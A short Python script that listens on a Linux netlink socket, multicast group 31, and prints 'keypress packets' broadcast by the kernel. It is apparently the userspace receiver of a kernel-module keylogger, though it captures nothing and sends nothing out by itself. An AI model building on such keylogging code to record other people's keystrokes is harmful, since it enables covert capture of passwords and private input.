#!/usr/bin/env python3
import socket
import sys

def create_conn():
    """
    Creates a socket connection which listens for keypress packets
    sent by the kernel.

    Returns the socket upon success, otherwise this function returns None
    """
    SOCK_GRP = 31
    try:
        sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_USERSOCK)

        sock.bind((0, 0))

        # 270 is SOL_NETLINK and 1 is NETLINK_ADD_MEMBERSHIP
        sock.setsockopt(270, 1, SOCK_GRP)

        return sock
    except socket.error as err:
        print(err)
        return None


def listen(sock):
    """
    Listens for keypress packets.
    """
    while True:
        try:
            print(sock.recvfrom(1024))
        except socket.error as err:
            print("[!] Socket receive failed with: ", err)
        except KeyboardInterrupt:
            break


def main():
    # Create the socket connection
    sock = create_conn()
    if not sock:
        print("[!] Socket creation failed")
        sys.exit(1)

    # Begin listening for keypress packets
    listen(sock)


if __name__ == '__main__':
    main()
